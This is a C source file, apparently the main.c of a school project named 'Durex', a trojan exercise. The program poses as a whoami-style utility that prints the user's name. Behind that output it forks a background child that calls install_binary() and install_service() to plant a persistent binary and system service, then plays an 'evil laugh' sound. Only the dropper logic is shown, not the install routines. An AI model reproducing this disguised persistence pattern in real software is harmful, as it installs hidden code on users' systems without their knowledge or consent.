/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/06/28 08:13:10 by root              #+#    #+#             */
/*   Updated: 2018/08/31 09:23:46 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* exit */
#include <stdlib.h>
/* getpwuid */
#include <sys/types.h>
#include <pwd.h>

#include "main.h"
#include <stdio.h>
void				print_usr_name()
{
	struct passwd	*passwd;
	int				fd;

	passwd = getpwuid(getuid());
	write(STDIN_FILENO, passwd->pw_name, mystrlen(passwd->pw_name));
	write(STDIN_FILENO, "\n", 1);
	if (seteuid(geteuid()) != 0)
		return ;
	fd = open(DUREX_BINARY_FILE, O_RDONLY, 0700);
	if (fd < 0) {
		if (fork() == 0) {
			if (!install_binary() && !install_service())
				system("mpg123 -q ./audio/Evil_Laugh.mp3 2>/dev/null");
			exit(0);
		}
		exit(0);
	}
	close(fd);
}

int					main(int ac, char **av)
{
	(void)ac;
	e.prog = av[0];
	print_usr_name();
	return 0;
}
